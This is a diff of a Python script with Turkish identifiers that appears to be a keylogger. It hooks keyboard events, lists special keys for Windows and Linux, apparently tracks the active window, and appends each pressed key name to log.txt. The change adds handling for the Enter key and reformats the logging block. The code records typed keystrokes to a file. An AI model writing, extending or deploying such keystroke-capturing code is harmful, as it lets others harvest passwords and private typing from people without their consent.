@@ -35,13 +35,13 @@ def aktifPencereWindows():
 # {
 tusWindows = [
   "tab","esc","right windows","left windows","ctrl","alt","alt gr","right shift", "shift", 
-  "right ctrl","backspace","enter","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
+  "right ctrl","backspace","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
   "delete","homepage","insert","print screen","num lock","page down","page up","end","up","down","right","left"
 ]
 
 tusLinux = [
     "tab", "esc", "meta", "left meta", "right meta", "control", "alt", "alt gr", "right shift", "shift",
-    "right ctrl", "backspace", "enter", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10",
+    "right ctrl", "backspace", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10",
     "f11", "f12", "delete", "home", "insert", "print", "num lock", "page down", "page up", "end",
     "up", "down", "right", "left"
 ]
@@ -69,11 +69,14 @@ def on_key_press(event):
   
   elif event.name == "caps lock":
     pass
+
+  elif event.name == "enter":
+    print('\n')
       
   else:
-    with open("log.txt", "a", encoding="utf8") as dosya:
-      dosya.write(event.name) 
-    print(event.name)        
+        with open("log.txt", "a", encoding="utf8") as dosya:
+            dosya.write(event.name)
+        print(event.name, end="") 
 # }
    
 with open("log.txt", "a", encoding='utf-8') as dosya: 
